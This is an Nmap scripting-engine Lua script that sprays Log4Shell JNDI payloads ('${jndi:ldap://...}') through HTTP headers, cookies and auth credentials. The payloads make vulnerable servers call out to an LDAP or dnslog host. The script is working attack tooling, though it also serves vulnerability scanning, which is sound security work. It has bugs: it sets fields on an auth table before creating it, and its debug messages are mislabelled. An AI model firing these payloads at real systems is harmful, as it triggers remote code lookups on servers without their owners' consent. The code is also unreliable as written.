local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"

description = [[
Requests for specific Log4j vuln.

The script will follow up to 5 HTTP redirects, using the default rules in the
http library.
]]

---
--@args http-log4shell.url The url to fetch. Default: /
--      http-log4shell.payload Payload to put. Default:
--@output

author = "Vlatko Kosturjak"

license = "Same as Nmap--See https://nmap.org/book/man-legal.html"

categories = {"default", "vuln", "safe", "log4shell"}

portrule = shortport.http

action = function(host, port)
  local resp, redirect_url, title

  local path = stdnse.get_script_args(SCRIPT_NAME..".url")
  local method = string.upper(stdnse.get_script_args(SCRIPT_NAME..".method") or "GET")
  local payload = stdnse.get_script_args(SCRIPT_NAME..".payload")
  local gpayload = stdnse.get_script_args("log4shell.payload")

  if not payload then
    if not gpayload then
      if nmap.registry['dnslog-cn'] then
	 stdnse.debug2("registry not present")
	 local registry = nmap.registry['dnslog-cn']
	 if registry.domain then
	       payload = "${jndi:ldap://{{target}}."..registry.domain.."}"
	 else
	       stdnse.debug2("session not present")
	 end
      else
	 payload = "${jndi:ldap://mydomain/uri}"
      end
      stdnse.debug1("Setting the payload to default payload:"..payload)
    else
      payload=gpayload
    end
  end

  if not path then
    path = "/"
  end

  target = host.ip .. "-" .. port.number
  payload = payload:gsub("{{target}}", target)

  stdnse.debug1("Final payload:"..payload)

  local request_opts = {
    header = {
      Referer = payload,
      Connection = "close"
    },
    bypass_cache = true,
    no_cache = true
  }

  request_opts['header']['User-Agent'] = payload
  request_opts['header']['X-Api-Version'] = payload
  request_opts['header']['X-Forwarded-For'] = payload
  local pcookie = "SessCookie=" .. payload
  request_opts['header']['Cookie'] = pcookie

  resp = http.get( host, port, path, request_opts )

  request_opts['header']['Host'] = payload

  resp = http.get( host, port, path, request_opts )

  -- check for a redirect
  if resp.location then
    redirect_url = resp.location[#resp.location]
    if resp.status and tostring( resp.status ):match( "30%d" ) then
      return {redirect_url = redirect_url}, ("Did not follow redirect to %s"):format( redirect_url )
    end
  end

  local response = http.generic_request( host, port, method, path, { no_cache = true } )

  if ( response.status ~= 401 ) then
    stdnse.debug1("Path does not require authentication")
    return
  end

  -- check if digest or ntlm auth is required
  local authmethod = "basic"
  local h = response.header['www-authenticate']
  if h then
    h = h:lower()
    if string.find(h, 'digest.-realm') then
      request_opts['auth'].digest = true
    end
    if string.find(h, 'ntlm') then
      request_opts['auth'].ntlm = true
    end
  end
  request_opts['auth'] = {}
  request_opts['auth'].username = payload
  request_opts['auth'].password = payload

  stdnse.debug1("Auth payload: %s", payload)
  local response = http.generic_request( host, port, method, path, request_opts)

  return
end
